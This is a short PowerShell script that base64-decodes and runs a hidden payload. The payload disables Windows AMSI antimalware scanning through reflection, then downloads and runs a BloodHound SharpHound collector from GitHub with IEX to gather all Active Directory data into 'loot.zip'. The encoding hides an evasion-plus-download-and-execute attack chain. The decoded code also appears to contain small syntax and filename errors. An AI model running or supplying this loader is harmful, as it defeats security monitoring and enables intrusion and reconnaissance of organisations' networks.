$encoded = @"
W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgic3lzdGVtLm1hbmFnZW1lbnQuYXV0b21hdGlvbi5hbXNpdXRpbHMiKS5HZXRGaWVsZCgiYW1zaUluaXRGYWlsZWQiLCJOb25QdWJsaWMsU3RhdGljIikud
FNldFZhbHVlKCRudWxsLHRydWU7CklFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NwZWN0ZXJP
cHMvQmxvb2RIb3VuZC1MZWdhY3kvbWFzdGVyL0NvbGxlY3RvcnMvU2hhcnBIb3VuZC5wc2MiKTsKSW52b2tlLUJsb29kSG91bmQgLUNvbGxlY3Rpb25NZXRob2QgQWxsIC1a
aXBGaWxlTmFtZSBsb290LnppcA==
"@ -replace "`r|`n", ""

$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
$sb = [ScriptBlock]::Create($decoded)
& $sb
